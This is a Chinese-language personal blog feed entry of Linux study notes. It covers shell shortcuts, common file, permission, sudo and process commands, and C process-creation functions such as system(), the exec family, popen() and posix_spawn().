Shell(zsh)</h3><p><code>bash</code>, <code>ksh</code>, <code>tcsh</code> 等特性的集大成者。</p><p>主要用途：</p><p>交互式使用：提供了开箱即用，十分强大的功能，如<strong>智能补全、主题支持、拼写纠正、全局别名</strong>等。</p><p>框架支持：Oh My Zsh 等配置框架的出现，让配置和管理 <code>zsh</code> 变得异常简单和强大。</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a><strong>基本操作</strong></h2><h3 id="按键操作"><a href="#按键操作" class="headerlink" title="按键操作"></a>按键操作</h3><p><strong>终端：</strong></p><p>Ctrl+Alt+F1~F6：六个虚拟控制台切换</p><p>Ctrl+Alt+F7：切换图形桌面界面</p><p>Ctrl+Alt+T：在图形界面中打开控制台</p><p><strong>命令行编辑</strong></p><p>Ctrl + A：将光标移动到行首</p><p>Ctrl + E：将光标移动到行尾</p><p>Ctrl + U：删除从光标位置到行首的所有内容</p><p>Ctrl + K：删除从光标位置到行尾的所有内容</p><p>Ctrl + W：删除光标前的一个单词</p><p>Ctrl +Y：粘贴刚才用 Ctrl+U&#x2F;K&#x2F;W 删除的内容</p><p>Ctrl + L：清屏</p><p><strong>进程控制</strong></p><p>Ctrl+C：强制终止正在运行的命令</p><p>Ctrl+Z：暂停当前进程并放入后台</p><p>Ctrl+D：发送中止信号，在空行中会退出当前终端会话，在程序中是输入结束</p><p><strong>图形界面窗口管理</strong></p><p>Alt+Tab：程序窗口切换</p><p>Alt+F4：关闭当前窗口</p><p>Alt + F7：（或按住Alt拖动窗口）移动窗口</p><p>Alt + F8：调整窗口大小</p><p>Super（Windows 键）：打开活动概述或应用程序菜单</p><p><strong>桌面操作</strong>（Super&#x3D;Win&#x3D;Command)</p><p>Super + D：显示桌面（最小化所有窗口）</p><p>Super + L：锁屏</p><p>PrintScreen：截取整个屏幕</p><p>Alt + PrintScreen：截取当前窗口</p><p><strong>nano文本编辑器操作</strong></p><p>Ctrl + O：保存文件</p><p>Ctrl + X：退出</p><p>Ctrl + K：剪切行</p><p>Ctrl + U：粘贴</p><p><strong>其他系统快捷键</strong></p><p>Ctrl + Alt + Delete：在 Linux 中通常会打开注销&#x2F;关机菜单</p><p>Ctrl + Alt + Esc：在某些桌面环境中，可以让鼠标指针变成”X”形，点击崩溃的窗口来强制关闭它</p><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><h4 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h4><p>ls：查看目录下所有信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-a    显示所有文件（包括 . 隐藏文件）</span><br><span class="line">-l    以列表长格式显示ls列出的信息</span><br><span class="line">-h    更直观的展现，显示文件大小（通常与l一起用）</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">-r    倒序列出ls查看信息</span><br><span class="line">-t    以时间顺序列出文件信息（最新的在前边）</span><br><span class="line">-d    只列出目录</span><br><span class="line">-R    递归显示目录中的所有文件以及子文件（文件包含的文件）</span><br></pre></td></tr></table></figure><p>cd：切换目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd返回到home家目录</span><br><span class="line">cd ~~后不加东西返回home家目录，加东西切换到指定用户的家目录</span><br><span class="line">cd .当前目录   </span><br><span class="line">cd ..上一级目录</span><br><span class="line">cd -切换到上一个工作目录</span><br></pre></td></tr></table></figure><p>touch：创建文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch 文件名  创建指定名字文件</span><br><span class="line">touch 已存在文件名修改时间</span><br></pre></td></tr></table></figure><p>mkdir：创建文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir创建单级文件夹，文件夹重名报错</span><br><span class="line">mkdir-p创建多级文件夹，文件夹重名也可创建，不报错</span><br></pre></td></tr></table></figure><p>rm：删除文件或目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-r删除目录</span><br><span class="line">-f强制删除</span><br></pre></td></tr></table></figure><p>cp：复制文件或目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-r移动文件夹</span><br><span class="line">-p复制时保留源文件的权限、所有者和时间戳信息</span><br><span class="line">-d复制时保留链接。这里所说的链接相当于 Windows 系统中的快捷方式。</span><br></pre></td></tr></table></figure><p>mv：移动文件或文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv 原路径 新路径移动文件或文件夹到指定路径下</span><br><span class="line">mv /ab/c /ab/c1 这种重复会将c文件夹重命名为c1，文件同理</span><br></pre></td></tr></table></figure><p>du：显示文件或目录磁盘使用情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-s显示指定文件或目录的总磁盘使用量（单位是KB)</span><br><span class="line">-h以易读的形式展现（显示大小M）</span><br><span class="line">-sh查看磁盘使用情况</span><br></pre></td></tr></table></figure><p>ln：创建链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s 源文件 链接后的文件软链接（符号链接）</span><br><span class="line">ln  源文件 链接后的文件硬链接</span><br></pre></td></tr></table></figure><p>echo：打印文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 内容 打印指定文本</span><br><span class="line">echo 内容 &gt;文件写入指定文件</span><br></pre></td></tr></table></figure><h4 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h4><p>cat：刷屏的形式显示文件内容</p><p>more：分页查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格键          向下翻一页</span><br><span class="line">回车键          向下翻一行</span><br><span class="line">b              向上翻一页（有限制）</span><br><span class="line">/关键词         搜索</span><br><span class="line">q              退出</span><br><span class="line">=              显示当前行号</span><br></pre></td></tr></table></figure><p>less：分页查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">空格键 或 f       向下翻一页</span><br><span class="line">b               向上翻一页</span><br><span class="line">回车键 或 ↓      向下翻一行</span><br><span class="line">↑               向上翻一行</span><br><span class="line">/关键词          向前搜索</span><br><span class="line">?关键词          向后搜索</span><br><span class="line">n               跳转到下一个匹配项</span><br><span class="line">N               跳转到上一个匹配项</span><br><span class="line">q               退出</span><br><span class="line">g               跳到文件开头</span><br><span class="line">G               跳到文件末尾</span><br><span class="line">:数字            跳到指定行号</span><br></pre></td></tr></table></figure><p>head：从头开始查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-n   n表示查看几行</span><br></pre></td></tr></table></figure><p>tail：从尾部开始查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-n   n表示查看几行</span><br></pre></td></tr></table></figure><h4 id="文件搜索和查询"><a href="#文件搜索和查询" class="headerlink" title="文件搜索和查询"></a>文件搜索和查询</h4><p>find：查找文件或命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">find [路径] [参数选项] </span><br><span class="line">-name　　按照文件名查找文件。        </span><br><span class="line">-perm 　　按照文件权限来查找文件。 　　　　　　　　</span><br><span class="line">-prune　　可以使find命令不在当前指定的目录中查找，如果同时使用-depth选项，那么-prune将被find命令忽略。 </span><br><span class="line">例如：　　find /apps -path &quot;/apps/bin&quot; -prune　　在/apps目录下查找文件，但不希望在/apps/bin目录下查找</span><br><span class="line">-user　　按照文件所有者来查找文件</span><br><span class="line">-group　　按照文件所属的组来查找文件</span><br><span class="line">-mtime　　按照文件的更改时间来查找文件</span><br><span class="line">-type　　按照文件类型查找</span><br><span class="line">　　　　　　　　b - 块设备文件</span><br><span class="line">　　　　　　　　d - 目录 </span><br><span class="line">　　　　　　　　c - 字符设备文件</span><br><span class="line">　　　　　　　　p - 管道文件</span><br><span class="line">　　　　　　　　l - 符号链接文件 </span><br><span class="line">　　　　　　　　f - 普通文件</span><br><span class="line">-size [+-]大小单位按文件大小搜索</span><br></pre></td></tr></table></figure><p>grep：过滤—搜索 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep [选项] &#x27;模式&#x27; 文件或目录</span><br><span class="line">-i忽略大小写</span><br><span class="line">-n显示行号</span><br><span class="line">-r递归搜索</span><br><span class="line">-v排除搜索</span><br></pre></td></tr></table></figure><p>locate：数据库查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate 路径</span><br></pre></td></tr></table></figure><h4 id="压缩和解压"><a href="#压缩和解压" class="headerlink" title="压缩和解压"></a>压缩和解压</h4><p>tar：解压缩文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar [选项] [文件名] [要操作的文件/目录]</span><br><span class="line">-z：有gzip属性的 </span><br><span class="line">-j：有bz2属性的 </span><br><span class="line">-v：显示所有过程 </span><br><span class="line">-c: 建立压缩档案 </span><br><span class="line">-x：解压 </span><br><span class="line">-t：查看内容 </span><br><span class="line">-r：向压缩归档文件末尾追加文件 </span><br><span class="line">-u：更新原压缩包中的文件</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>pwd：显示当前工作目录完整路径</p><p>who：显示当前登录用户</p><p>passwd：修改密码</p><p>chmod：修改文件或目录权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chmod 对象类别 操作符 权限 文件  / chmod 权限数字 文件</span><br><span class="line">对象类别：</span><br><span class="line">u：用户/所有者</span><br><span class="line">g：组</span><br><span class="line">o：其他人</span><br><span class="line">a：所有人</span><br><span class="line">操作符：</span><br><span class="line">+：添加权限</span><br><span class="line">-：删除权限</span><br><span class="line">=：精确赋予权限</span><br><span class="line">权限：</span><br><span class="line">r（4）：读</span><br><span class="line">w（2）：写</span><br><span class="line">x（1）：执行</span><br></pre></td></tr></table></figure><p>chown：修改文件或目录所有者（仅管理员可以使用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chown [选项] 用户名:组名 文件或目录</span><br><span class="line">可以只修改组或者所有者，也可以同时修改</span><br><span class="line">用户名和组也可以使用UID和GID：</span><br><span class="line">0为root用户（组）；1-999为系统用户（组）；1000-60000为普通用户（组）；65534为nobody用户</span><br><span class="line">-R：递归</span><br><span class="line">-v：详细显示</span><br><span class="line">-c：仅显示更改</span><br></pre></td></tr></table></figure><p>setfacl：设置文件或目录的访问控制列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setfacl 选项 条目类型:目标:权限 文件</span><br><span class="line">-m：修改/添加权限条目</span><br><span class="line">-x：删除权限条目</span><br><span class="line">-b：删除所有权限条目</span><br><span class="line">setfacl 选项 d:条目类型:目标:权限 目录</span><br><span class="line">d：设置默认权限（新建文件自动继承）</span><br></pre></td></tr></table></figure><p>getfacl：查看ACL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getfacl 文件</span><br><span class="line">getfacl 目录/</span><br></pre></td></tr></table></figure><p>ping：测试网络连通性</p><p>ifconfig：显示网络接口信息</p><p>netstat：显示网络状态信息</p><p>wget：下载文件</p><p>scp：在本地和远程主机之间复制文件</p><p>crul：</p><p>sleep：睡眠</p><p>last：显示&#x2F;var&#x2F;log&#x2F;wtmp文件内容，用户登录历史及系统重启历史 </p><p>lastb：显示&#x2F;var&#x2F;log&#x2F;btmp文件内容，用户错误的登录尝试</p><p>lastlog：显示每个用户最近一次成功登录信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u 用户名  显示特定用户最近的登录信息</span><br></pre></td></tr></table></figure><p>basename：显示路径基名</p><p>chattr：用于改变文件的特殊属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chattr [选项] [+/-/=属性] [文件或目录]</span><br><span class="line">选项：</span><br><span class="line">-R递归</span><br><span class="line">-V显示过程</span><br><span class="line"></span><br><span class="line">属性：</span><br><span class="line">+用于增加属性</span><br><span class="line">-用户删除属性</span><br><span class="line">=用于指定属性</span><br><span class="line">A告诉系统不要修改该文件的最后访问时间</span><br><span class="line">a//只能向文件追加数据，不能删除</span><br><span class="line">i//设定文件不能被删除，改名，写入或新增内容</span><br></pre></td></tr></table></figure><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="权限简介"><a href="#权限简介" class="headerlink" title="权限简介"></a>权限简介</h3><p>Linux权限是操作系统用来限制对资源访问的机制，权限一般分为读（r）、写（w）、执行（x）。系统中每个文件都拥有特定的权限：属主、属组以及其他人，通过这样的机制来限制哪些用户或用户组可以对特定文件进行相应的操作。</p><h3 id="权限分类"><a href="#权限分类" class="headerlink" title="权限分类"></a>权限分类</h3><table><thead><tr><th align="left">属主</th><th>owne</th><th>u</th></tr></thead><tbody><tr><td align="left">属组</td><td>group</td><td>g</td></tr><tr><td align="left">其他人</td><td>other</td><td>o</td></tr></tbody></table><h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>普通用户执行时以root身份运行</p><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>可执行文件：运行程序时，进程的组变成程序文件的所属组</p><p>目录：在此目录中创建的文件，其所属组自动继承目录的组</p><h4 id="Sticky"><a href="#Sticky" class="headerlink" title="Sticky"></a>Sticky</h4><p>在公共目录中，用户只能删除自己创建的文件，不能删除他人的文件</p><h3 id="遮罩码"><a href="#遮罩码" class="headerlink" title="遮罩码"></a>遮罩码</h3><p>新建文件和新建目录的默认权限是由遮罩码umask来控制的，遮罩码通常用来隐藏一些权限</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件最高权限 - 遮罩码 = 文件最终权限</span><br><span class="line">目录最高权限 - 遮罩码 = 目录最终权限</span><br><span class="line">setfacl -m <span class="attr">m</span>::最大权限 文件或目录</span><br></pre></td></tr></table></figure><h3 id="SUDO借权"><a href="#SUDO借权" class="headerlink" title="SUDO借权"></a>SUDO借权</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>临时提权：让普通用户临时以 root 或其他用户身份执行命令</p><p>精细控制：可以控制用户能执行哪些命令、以谁的身份执行</p><p>审计追踪：所有 sudo 操作都会被记录</p><h4 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h4><p>通过visudo 编辑配置文件 <code>/etc/sudoers</code> 定义用户可执行的命令范围</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo [选项] [要借用的身份] 命令 [命令的参数]</span><br><span class="line">选项</span><br><span class="line">-V    显示版本编号</span><br><span class="line">-h    帮助信息，会显示版本编号及指令的使用方式说明</span><br><span class="line">-l    列出当前用户可以使用的所有sudo类命令</span><br><span class="line">-v    重新做一次密码确认，如果超过N（默认为5）分钟，也会问密码</span><br><span class="line">-k    立刻清除认证信息，如果不指定-k，默认认证信息在5分钟后失效</span><br><span class="line">-b    将要执行的指令放在后台执行</span><br></pre></td></tr></table></figure><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.在 LINUX 中，每个执行的程序（代码）都称为一个进程。每一个进程都分配一个 ID 号</span><br><span class="line">2.每一个进程，都会对应一个父进程，而这个父进程可以复制多个子进程</span><br><span class="line">3.每个进程都可能以两种方式存在的。前台与后台，所谓前台进程就是用户目前的屏幕上可以进行操作的。后台进程则是实际在操作，但由于屏幕上无法看到的进程，通常使用后台方式执行</span><br><span class="line">4.一般系统的服务都是以后台进程的方式存在，而且都会常驻在系统中。直到关机才才结束</span><br></pre></td></tr></table></figure><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><p>查看进行使用的指令是     ps ,一般来说使用的参数是 <code>ps -aux</code>,<code>ps -ef</code>,正常与<code>grep</code>连用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-aux查看所有进程详细信息</span><br><span class="line">-ef另一种格式查看所有进程</span><br><span class="line">-ejH显示进程层次关系</span><br><span class="line">auxf显示进程树结构</span><br><span class="line">pstree专门的进程树命令</span><br><span class="line">aux | grep 进程名  查找特定进程</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stat进程状态</span><br><span class="line"><span class="attr">S</span>:睡眠</span><br><span class="line"><span class="attr">s</span>:会话的先导进程</span><br><span class="line"><span class="attr">N</span>:进程拥有比普通优先级更低的优先级</span><br><span class="line"><span class="attr">R</span>:正在运行</span><br><span class="line"><span class="attr">D</span>:短期等待</span><br><span class="line"><span class="attr">Z</span>:僵尸进程</span><br><span class="line"><span class="attr">T</span>:被跟踪或者被停止</span><br><span class="line">command启动进程所用的命令和参数，如果过长会被截断显示</span><br></pre></td></tr></table></figure><p>![img](file:&#x2F;&#x2F;&#x2F;C:\Users\wsad\Documents\Tencent Files\1926640039\nt_qq\nt_data\Pic\2025-11\Ori\d922bef94804f882d5073810044606b6.png)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid进程id</span><br><span class="line">ppid父进程id</span><br><span class="line">C进程占cpu百分比</span><br></pre></td></tr></table></figure><p><img src="https://ask.qcloudimg.com/http-save/yehe-5860518/r6j7uc0f5d.png" alt="img"></p><h3 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kill 进程号     停止进程</span><br><span class="line">kill-<span class="number">9</span> 进程号   强迫进程立即停止</span><br><span class="line">killall 进程名称停止所有相同的进程名称</span><br></pre></td></tr></table></figure><h3 id="动态进程监控"><a href="#动态进程监控" class="headerlink" title="动态进程监控"></a>动态进程监控</h3><p>top命令与ps命令都用于查看进程，但是top命令可以隔一段时间更新进程状态</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">top [选项]</span><br><span class="line">-d指定每隔几秒更新,默认<span class="number">3</span>秒</span><br><span class="line">-i不显示任何闲置或者僵尸进程</span><br><span class="line">-p id号监听指定进程</span><br><span class="line">交互操作:</span><br><span class="line">P以cpu使用率排序,默认就这个</span><br><span class="line">M以内存使用率排序</span><br><span class="line">N以pid排序</span><br><span class="line">u监听具体用户</span><br><span class="line">k终止指定进程</span><br><span class="line">q退出top</span><br></pre></td></tr></table></figure><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>磁盘文件系统：NTFS,EXT3</p><p>闪存文件系统：JFFS2,YAFFS</p><p>数据库文件系统：BFFS,WINFS</p><p>网络文件系统：NFS</p><p>虚拟文件系统：VFS（Proc）</p><p>用于内存交换的特殊文件系统：swap（其实现的方式有以下两种：第一种是进行内存排列像内存池一样，进行优化；第二种是把硬盘上的空间模拟成内存。）</p><h3 id="不同颜色对应文件"><a href="#不同颜色对应文件" class="headerlink" title="不同颜色对应文件"></a>不同颜色对应文件</h3><p>蓝色：目录文件<br> 绿色：可执行文件<br> 浅蓝色：链接文件<br> 红色：压缩文件<br> 灰色：其他文件</p><h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><h3 id="1、system"><a href="#1、system" class="headerlink" title="1、system"></a>1、system</h3><p>system()是封装最彻底的函数，核心特点是简单易用，无需关注进程细节，但灵活性最差。</p><p>核心逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(command)→fork()子进程 → 子进程中execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, command, NULL)→ 父进程waitpid()等待。</span><br></pre></td></tr></table></figure><p>局限性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无法直接获取命令输出（需重定向到文件）。</span><br><span class="line">依赖 `/bin/sh`（部分嵌入式系统可能没有）。</span><br><span class="line">安全性较低：若 `command` 包含用户输入，易引发命令注入（如 `system(&quot;ls &quot; + user_input)`）。</span><br></pre></td></tr></table></figure><h3 id="2、exec系列"><a href="#2、exec系列" class="headerlink" title="2、exec系列"></a>2、exec系列</h3><p>exec直接替换当前进程，不返回，无内置等待机制，需手动配合 fork（创建子进程）+ waitpid（等待子进程结束），支持自定义环境变量、参数动态传递，适合复杂命令场景。</p><table><thead><tr><th>函数名</th><th>核心特点</th><th>示例</th></tr></thead><tbody><tr><td>execl</td><td>参数列表传递（以空指针 (char*)NULL 结尾）</td><td><code>execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-la&quot;, NULL);</code></td></tr><tr><td>execlp</td><td>自动从 <code>PATH</code> 环境变量查找命令</td><td><code>execlp(&quot;ls&quot;, &quot;ls&quot;, &quot;-la&quot;, NULL);</code></td></tr><tr><td>execle</td><td>带环境变量（最后一个参数是自定义环境数组）</td><td><code>char* env[] = {&quot;PATH=/bin&quot;, NULL}; execle(&quot;ls&quot;, &quot;ls&quot;, &quot;-la&quot;, NULL, env)</code></td></tr><tr><td>execv</td><td>参数数组传递（适合参数数量不确定场景）</td><td><code>char* args[] = {&quot;ls&quot;, &quot;-la&quot;, NULL}; execv(&quot;/bin/ls&quot;, args);</code></td></tr><tr><td>execvp</td><td>路径自动查找 + 参数数组传递（最常用）</td><td><code>char* args[] = {&quot;ls&quot;, &quot;-la&quot;, NULL}; execvp(&quot;ls&quot;, args);</code></td></tr><tr><td>execvpe</td><td>路径查找 + 参数数组 + 自定义环境变量</td><td><code>char* args[] = {&quot;ls&quot;, &quot;-la&quot;, NULL}; char* env[] = {&quot;PATH=/bin&quot;, NULL}; execvpe(&quot;ls&quot;, args, env);</code></td></tr></tbody></table><h3 id="3、popen-pclose"><a href="#3、popen-pclose" class="headerlink" title="3、popen() + pclose()"></a>3、popen() + pclose()</h3><p>库函数，带 IO 管道交互；popen()是封装后的库函数，核心优势是创建管道与子进程通信，能直接读取命令输出或向命令写入输入（比 system()多了 IO 交互能力，但只能单向）；pclose()会等待子进程结束，自动回收资源，避免僵尸进程。</p><p>底层逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fork子进程 + exec执行命令 + 创建匿名管道（单向通信）。</span><br></pre></td></tr></table></figure><p>支持两种模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读模式（&quot;r&quot;）：读取命令的标准输出（如 ls -la 的结果）。</span><br><span class="line">写模式（&quot;w&quot;）：向命令的标准输入传递数据（如向 grep 传递内容）。</span><br></pre></td></tr></table></figure><h3 id="4、fork-exec"><a href="#4、fork-exec" class="headerlink" title="4、fork() +exec"></a>4、fork() +exec</h3><p>system()的底层实现就是fork()+ exec()+waitpid()，手动组合这三个函数能完全控制进程创建、命令执行、资源回收的全流程。</p><p>核心逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、fork()：创建子进程（父进程返回子进程PID，子进程返回0）。</span><br><span class="line">2、子进程中调用exec执行命令（替换子进程映像）。</span><br><span class="line">3、父进程用waitpid()等待子进程结束，获取退出状态，回收资源</span><br></pre></td></tr></table></figure><h3 id="5、posix-spawn"><a href="#5、posix-spawn" class="headerlink" title="5、posix_spawn()"></a>5、posix_spawn()</h3><p>posix_spawn()是POSIX标准的库函数，专门用于高效创建并执行新进程，底层优化了上下文切换，比fork+exec更节省资源（适合嵌入式、高性能场景）。</p><p>核心特点:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、无需手动fork，直接创建子进程并执行命令，一步完成。</span><br><span class="line">2、支持传递参数、环境变量、文件描述符控制（如重定向stdin/stdout）。</span><br><span class="line">3、兼容性好，跨POSIX系统（Linux、Unix、macOS）通用。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;shell&quot;&gt;&lt;a href=&quot;#shell&quot; class=&quot;headerlink&quot; title=&quot;shell&quot;&gt;&lt;/a&gt;shell&lt;/h2&gt;&lt;p&gt;命令解释器&amp;#x2F;一种强大的脚本语言&lt;/p&gt;
&lt;h3 id=&quot;Bourne-Shell-sh&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
</feed>
